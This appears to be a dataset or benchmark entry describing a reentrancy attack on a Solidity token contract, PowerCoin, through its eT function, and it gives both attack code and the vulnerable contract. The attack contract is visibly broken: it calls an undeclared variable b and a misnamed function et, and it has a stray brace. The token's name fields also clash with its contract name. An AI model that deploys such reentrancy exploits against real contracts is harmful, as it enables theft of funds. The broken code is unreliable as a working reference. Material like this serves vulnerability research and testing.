# Attack03

### Contract Name:

PowerCoin (test1363.sol)

### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

1 external function

### Victim Function:

`eT(address,uint256,uint256)`

### Attack Mechanism:

Attack code:

```javascript
contract Attack is IERC20Token{
    PowerCoin p = new PowerCoin();
    constructor() payable {}
    function deposit() public {   // Disguised attack function
        //victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
        b.et(this, 10, 10);
    }
    function() payable {
        b.et(this, 10, 10);
    }
    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}

```

Attacked code:

```javascript
contract PowerCoin is Ownable, StandardToken {

    string public name = "CapricornCoin";
    string public symbol = "CCC";
    uint public decimals = 18;                  // token has 18 digit precision

    uint public totalSupply = 10 * (10**6) * (10**18);  // 10 Million Tokens

    event ET(address indexed _pd, uint _tkA, uint _etA);
    function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
        balances[_pd] = safeAdd(balances[_pd], _tkA);
        if (!_pd.call.value(_etA)()) revert();
        ET(_pd, _tkA, _etA);
        return true;
    }
}
```
In this case, the goal of our reentrancy is `_pd.call.value(_etA)()` because `_pd` is the source of taint. 

**Attack.** The attacker call `deposit()` function to start attack.